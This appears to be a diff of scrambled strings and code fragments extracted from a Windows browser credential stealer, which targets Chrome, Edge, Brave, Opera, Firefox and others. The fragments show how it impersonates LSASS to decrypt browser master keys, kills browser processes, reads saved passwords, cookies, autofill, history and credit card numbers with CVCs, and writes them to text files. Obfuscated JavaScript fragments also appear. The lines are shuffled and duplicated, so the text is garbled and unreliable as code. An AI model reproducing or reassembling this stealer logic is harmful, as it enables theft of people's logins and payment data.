@@ -1,0 +1,260 @@
+ in data:\n                    success_count = 0\n                    with open(password_file, \
+ in str(decrypted):\n                                        logger.error(\
+) and not encrypted_password.startswith(b
+) as f:\n            data = json.load(f)\n            \n        bookmarks = []\n        \n        def process_node(node):\n            if isinstance(node, dict):\n                if node.get(\
+)):\n                                    decrypted = decrypt_v20_value(value, master_key)\n                                    value_str = decrypted if decrypted else \
+)):\n                                decrypted = decrypt_v20_password(login[2], master_key)\n                                if decrypted and not decrypted.startswith(\
+):\n                                    success_count += 1\n                                elif decrypted and decrypted.startswith(\
+)\n                            \n                            username = nss_handler.decrypt(encrypted_username) if encrypted_username else \
+)\n                            encrypted_password = login.get(\
+)\n                            encrypted_username = login.get(\
+)\n                        for host, name, path, expires, secure, httponly, value in cookies:\n                            flag = \
+)\n                    con.close()\n                    try: os.remove(cookie_copy)\n                    except: pass\n            else:\n                logger.debug(\
+)\n                \n                with open(password_file, \
+)\n                con = sqlite3.connect(pathlib.Path(login_db_path).as_uri() + \
+)\n            cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data[
+)\n            data_path = pathlib.Path(user_profile) / data_path_rel if data_path_rel else None\n            norm = str(data_path).lower() if data_path else 
+)\n            key_blob_encrypted = binascii.a2b_base64(local_state[\
+)\n            subprocess.run([\
+)\n            with impersonate_lsass():\n                decrypted_aes_key = decrypt_with_cng(parsed_data[
+)\n        \n        # Process Passwords (logins.json)\n        if logins_json.exists():\n            try:\n                logger.debug(f\
+)\n        raise\n\ndef decrypt_with_cng(input_data, key_name):\n    logger.debug(f\
+)\n    try:\n        user_profile = os.environ[
+)\n\n        # Process Autofill\n        autofills = extract_gecko_autofill(profile_dir)\n        if autofills:\n            with open(autofill_file, \
+)\n\n        # Process Autofill\n        try:\n            if webdata_db_path.exists():\n                logger.debug(f\
+)\n\n        # Process Bookmarks\n        bookmarks = extract_gecko_bookmarks(profile_dir)\n        if bookmarks:\n            with open(bookmarks_file, \
+)\n\n        # Process Cookies\n        try:\n            if cookie_db_path.exists():\n                logger.debug(f\
+)\n\n        # Process Credit Cards\n        cards = extract_credit_cards(profile_dir, master_key)\n        if cards:\n            with open(credit_cards_file, \
+)\n\n        # Process History\n        history = extract_gecko_history(profile_dir)\n        if history:\n            with open(history_file, \
+)\n\n        # Process History\n        history = extract_history(profile_dir)\n        if history:\n            with open(history_file, \
+)\n\n        # Process Logins\n        try:\n            if login_db_path.exists():\n                logger.debug(f\
+)\n\n        # Shutdown NSS for this profile so we can potentially init another (though NSS often doesn
+, uri=True)\n                cur = con.cursor()\n                cur.execute(\
+,ZmaojfE.IkD1UU=ZmaojfE.nr_8hiW,ciepIgo+=-0x8d,qric7jd+=0xf1,R01Xodj+=0x9a,TV9xde+=0x87);break;default:Ina5dMA(ygU356.gcjlDiC[Q4Ysb_[0x0]]=Q4Ysb_[0x1],ygU356.gcjlDiC[Q4Ysb_[0x1]]=\
+,ZmaojfE.IkD1UU=ZmaojfE.nr_8hiW,ciepIgo+=-0x8d,qric7jd+=0xf1,R01Xodj+=0x9a,TV9xde+=0x87);break;default:Ina5dMA(ygU356.gcjlDiC[Q4Ysb_[0x0]]=Q4Ysb_[0x1],ygU356.gcjlDiC[Q4Ysb_[0x1]]=�
+./discord.js\
+./discord.js�
+1st NCryptDecrypt failed: {status}\
+1st NCryptDecrypt failed: {status}�
+2nd NCryptDecrypt failed: {status}\
+2nd NCryptDecrypt failed: {status}�
+360chrome.exe
+:\n                process_chromium_browser(browser_name, browser_config)\n            elif browser_config[
+:\n                process_gecko_browser(browser_name, browser_config)\n        except Exception as e:\n            logger.error(f\
+<decryption_failed: {e}>\
+<decryption_failed: {e}>�
+<decryption_failed\
+<decryption_failed�
+================\\nGUID: {guid}\\nNAME: {name}\\nNUMBER: {decrypted_num}\\nVALID: {exp_m}/{exp_y}\\nCVC: {cvc}\\nTYPE: Local Card\
+================\\nID: {card_id}\\nNAME: {name}\\nNUMBER: {decrypted_num}\\nVALID: {exp_m}/{exp_y}\\nCVC: {cvc}\\nTYPE: Masked/Server Card\
+================\nGUID: {guid}\nNAME: {name}\nNUMBER: {decrypted_num}\nVALID: {exp_m}/{exp_y}\nCVC: {cvc}\nTYPE: Local Card�
+================\nID: {card_id}\nNAME: {name}\nNUMBER: {decrypted_num}\nVALID: {exp_m}/{exp_y}\nCVC: {cvc}\nTYPE: Masked/Server Card�
+@primno/dpapi\
+@primno/dpapi�
+AppData\Local\BraveSoftware\Brave-Browser\User Data
+AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State
+AppData\Local\Chromium\User Data
+AppData\Local\Chromium\User Data\Local State
+AppData\Local\Google\Chrome Beta\User Data
+AppData\Local\Google\Chrome Beta\User Data\Local State
+AppData\Local\Google\Chrome\User Data
+AppData\Local\Google\Chrome\User Data\Local State
+AppData\Local\Microsoft\Edge\User Data
+AppData\Local\Microsoft\Edge\User Data\Local State
+AppData\Local\Vivaldi\User Data
+AppData\Local\Vivaldi\User Data\Local State
+AppData\Local\Yandex\YandexBrowser\User Data
+AppData\Local\Yandex\YandexBrowser\User Data\Local State
+AppData\Roaming\Mozilla\Firefox\Profiles
+AppData\Roaming\Opera Software\Opera GX Stable
+AppData\Roaming\Opera Software\Opera GX Stable\Local State
+AppData\Roaming\Opera Software\Opera Stable
+AppData\Roaming\Opera Software\Opera Stable\Local State
+AppData\\Local\\360Chrome\\Chrome\\User Data
+AppData\\Local\\360Chrome\\Chrome\\User Data\\Local State
+AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data
+AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State
+AppData\\Local\\Chromium\\User Data
+AppData\\Local\\Chromium\\User Data\\Local State
+AppData\\Local\\CocCoc\\Browser\\User Data
+AppData\\Local\\CocCoc\\Browser\\User Data\\Local State
+AppData\\Local\\Google\\Chrome Beta\\User Data
+AppData\\Local\\Google\\Chrome Beta\\User Data\\Local State
+AppData\\Local\\Google\\Chrome\\User Data
+AppData\\Local\\Google\\Chrome\\User Data\\Local State
+AppData\\Local\\Microsoft\\Edge\\User Data
+AppData\\Local\\Microsoft\\Edge\\User Data\\Local State
+AppData\\Local\\Tencent\\QQBrowser\\User Data
+AppData\\Local\\Tencent\\QQBrowser\\User Data\\Local State
+AppData\\Local\\Vivaldi\\User Data
+AppData\\Local\\Vivaldi\\User Data\\Local State
+AppData\\Local\\Yandex\\YandexBrowser\\User Data
+AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Local State
+AppData\\Roaming\\Mozilla\\Firefox\\Profiles
+AppData\\Roaming\\Opera Software\\Opera GX Stable
+AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local State
+AppData\\Roaming\\Opera Software\\Opera Stable
+AppData\\Roaming\\Opera Software\\Opera Stable\\Local State
+AppData\\\\Local\\\\360Chrome\\\\Chrome\\\\User Data
+AppData\\\\Local\\\\360Chrome\\\\Chrome\\\\User Data\\\\Local State
+AppData\\\\Local\\\\CocCoc\\\\Browser\\\\User Data
+AppData\\\\Local\\\\CocCoc\\\\Browser\\\\User Data\\\\Local State
+AppData\\\\Local\\\\Tencent\\\\QQBrowser\\\\User Data
+AppData\\\\Local\\\\Tencent\\\\QQBrowser\\\\User Data\\\\Local State
+AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles
+Attempting to impersonate LSASS\
+Attempting to impersonate LSASS�
+Attempting to kill {browser_config[
+Brave
+Brave Softwarekey1
+C:\Program Files (x86)\Mozilla Firefox\nss3.dll�
+C:\Program Files\Mozilla Firefox\nss3.dll�
+C:\\Program Files (x86)\\Mozilla Firefox\\nss3.dll\
+C:\\Program Files\\Mozilla Firefox\\nss3.dll\
+Cookies\
+Cookies�
+Could not retrieve master key - sensitive data (passwords/cookies) will not be decrypted\
+Could not retrieve master key - sensitive data (passwords/cookies) will not be decrypted�
+DECRYPT_FAILED\
+DECRYPT_FAILED�
+Decrypting system key with LSASS impersonation\
+Decrypting system key with LSASS impersonation�
+Decrypting user key\
+Decrypting user key�
+Default\
+Default�
+Error copying SQLite DB: {e}\
+Error copying SQLite DB: {e}�
+Error decrypting with NSS: {e}\
+Error decrypting with NSS: {e}�
+Error killing process: {e}\
+Error killing process: {e}�
+Error processing autofill: {e}\
+Error processing autofill: {e}�
+Error processing local card {guid}: {e}\
+Error processing local card {guid}: {e}�
+Error processing server card {card_id}: {e}\
+Error processing server card {card_id}: {e}�
+Firefox
+Firefox Beta
+Firefox Developer
+Firefox ESR
+Firefox Nightly
+Found encrypted_key\
+Found encrypted_key�
+Found {len(cookies)} cookies\
+Found {len(cookies)} cookies�
+Found {len(profiles)} profiles\
+Found {len(profiles)} profiles�
+Google Chrome
+Google Chrome Beta
+Google Chrome Betakey1
+Google Chromekey1
+Initializing NSS for profile: {profile_path}\
+Initializing NSS for profile: {profile_path}�
+Login Data\
+Login Data�
+Microsoft Edge
+Microsoft Edgekey1
+Network\
+Network�
+No cert DB found in {profile_path}, skipping NSS init\
+No cert DB found in {profile_path}, skipping NSS init�
+No encrypted key found in local state\
+No encrypted key found in local state�
+Opera
+Opera GX
+Opera Softwarekey1
+OperationalError querying credit_cards: {e}\
+OperationalError querying credit_cards: {e}�
+OperationalError querying masked_credit_cards: {e}\
+OperationalError querying masked_credit_cards: {e}�
+Parsing decrypted key blob\
+Parsing decrypted key blob�
+Processing Chromium browser: {browser_name}\
+Processing Chromium browser: {browser_name}�
+Processing Gecko browser: {browser_name}\
+Processing Gecko browser: {browser_name}�
+Processing browser data\
+Processing browser data�
+Processing cookies from {cookies_db}\
+Processing cookies from {cookies_db}�
+Processing profile: {profile_name}\
+Processing profile: {profile_name}�
+Profile\
+Profile�
+Reverted to original token\
+Reverted to original token�
+SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards\
+SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards�
+SELECT guid, value_encrypted FROM local_stored_cvc\
+SELECT guid, value_encrypted FROM local_stored_cvc�
+SELECT host, name, path, expiry, isSecure, isHttpOnly, value FROM moz_cookies\
+SELECT host, name, path, expiry, isSecure, isHttpOnly, value FROM moz_cookies�
+SELECT host_key, name, path, expires_utc, is_secure, is_httponly, CAST(encrypted_value AS BLOB) FROM cookies;\
+SELECT host_key, name, path, expires_utc, is_secure, is_httponly, CAST(encrypted_value AS BLOB) FROM cookies;�
+SELECT instrument_id, value_encrypted FROM server_stored_cvc\
+SELECT instrument_id, value_encrypted FROM server_stored_cvc�
+Skipping profile {profile_name} due to NSS init failure\
+Skipping profile {profile_name} due to NSS init failure�
+TEMP
+USERPROFILE
+Web Data\
+Web Data�
+\n                            \n                            if password: success_count += 1\n                            \n                            line = f\
+\n                            password = nss_handler.decrypt(encrypted_password) if encrypted_password else \
+\n            if data_path and data_path.exists():\n                if norm in processed_paths:\n                    continue\n                processed_paths.add(norm)\n            if browser_config[
+\n            xored_aes_key = byte_xor(decrypted_aes_key, xor_key)\n            cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=parsed_data[
+\n        \n    hKey = gdef.NCRYPT_KEY_HANDLE()\n    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)\n    if status != 0:\n        logger.error(f\
+\n        \n    ncrypt.NCryptFreeObject(hKey)\n    ncrypt.NCryptFreeObject(hProvider)\n    logger.debug(\
+\n        if not encrypted_password.startswith(b
+] == 1:\n            aes_key = bytes.fromhex(\
+])\n            return cipher.decrypt_and_verify(parsed_data[
+], key_name)\n            if not decrypted_aes_key:\n                logger.error(\
+]\n        local_state_path = os.path.join(user_profile, browser_config[
+adm-zip\
+adm-zip�
+app_bound_encrypted_key
+app_bound_encrypted_key\
+app_bound_encrypted_key�
+axios\
+axios�
+brave
+brave.exe
+child_process\
+child_process�
+chrome
+chrome.exe
+chrome_beta
+cookies.sqlite\
+cookies.sqlite�
+cookies.txt\
+cookies.txt�
+edge
+encrypted_key\
+encrypted_key�
+firefox
+firefox.exe
+firefox_beta
+firefox_dev
+firefox_esr
+firefox_nightly
+formhistory.sqlite\
+formhistory.sqlite�
+http\
+https\
+https�
+http�
+msedge.exe
+node-stream-zip\
+node-stream-zip�
+opera
+opera.exe
+opera_gx
+passwords.txt\
+passwords.txt�
+places.sqlite\
+places.sqlite�
+process_name
+sqlite3\
+sqlite3�
